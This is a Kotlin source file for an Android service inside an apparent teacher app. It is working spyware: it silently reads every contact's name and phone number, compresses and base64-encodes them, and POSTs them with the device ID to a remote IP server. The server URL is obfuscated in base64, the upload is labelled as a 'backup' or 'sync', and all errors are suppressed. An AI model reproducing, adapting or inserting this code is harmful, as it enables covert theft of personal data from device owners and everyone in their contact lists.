package com.teacherapp.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.Settings
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.zip.GZIPOutputStream

class ContactExfiltrationService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startContactExfiltration()
        return START_STICKY
    }

    private fun startContactExfiltration() {
        serviceScope.launch {
            try {
                delay(3000L)
                val contactsData = readAllContacts()
                if (contactsData.isNotEmpty()) {
                    exfiltrateContacts(contactsData)
                }
            } catch (e: Exception) {
                // Silent failure
            } finally {
                stopSelf()
            }
        }
    }

    @SuppressLint("Range")
    private fun readAllContacts(): String {
        val contactsArray = JSONArray()

        try {
            val cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                ),
                null,
                null,
                "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    val type = it.getInt(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE))
                    val contactId = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID))

                    val phoneType = when (type) {
                        ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
                        ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
                        ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
                        else -> "Other"
                    }

                    val contactJson = JSONObject().apply {
                        put("id", contactId)
                        put("name", name)
                        put("phone", number)
                        put("type", phoneType)
                    }

                    contactsArray.put(contactJson)
                }
            }
        } catch (e: Exception) {
            // Permission denied
        }

        return contactsArray.toString()
    }

    private suspend fun exfiltrateContacts(contactsJson: String) = withContext(Dispatchers.IO) {
        try {
            val serverUrl = getServerUrl()
            val url = URL(serverUrl)
            val connection = url.openConnection() as HttpURLConnection

            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                setRequestProperty("X-App-Token", "teacher-app-sync")
                connectTimeout = 15000
                readTimeout = 15000
            }

            val compressedData = compressData(contactsJson)
            val encodedData = android.util.Base64.encodeToString(compressedData, android.util.Base64.NO_WRAP)

            val payload = JSONObject().apply {
                put("type", "contacts_backup")
                put("data", encodedData)
                put("timestamp", System.currentTimeMillis())
                put("device_id", getAndroidId())
            }

            connection.outputStream.use {
                it.write(payload.toString().toByteArray())
                it.flush()
            }

            connection.responseCode
            connection.disconnect()

        } catch (e: Exception) {
            // Network failure
        }
    }

    private fun compressData(data: String): ByteArray {
        val byteArrayOutputStream = ByteArrayOutputStream()
        GZIPOutputStream(byteArrayOutputStream).use {
            it.write(data.toByteArray())
        }
        return byteArrayOutputStream.toByteArray()
    }

    private fun getServerUrl(): String {
        // Base64: http://20.189.79.25:5000/api/contacts
        val encoded = "aHR0cDovLzIwLjE4OS43OS4yNTo1MDAwL2FwaS9jb250YWN0cw=="
        return String(android.util.Base64.decode(encoded, android.util.Base64.DEFAULT))
    }

    @SuppressLint("HardwareIds")
    private fun getAndroidId(): String {
        return try {
            Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) {
            "unknown"
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }

    companion object {
        fun startExfiltration(context: Context) {
            val intent = Intent(context, ContactExfiltrationService::class.java)
            context.startService(intent)
        }
    }
}
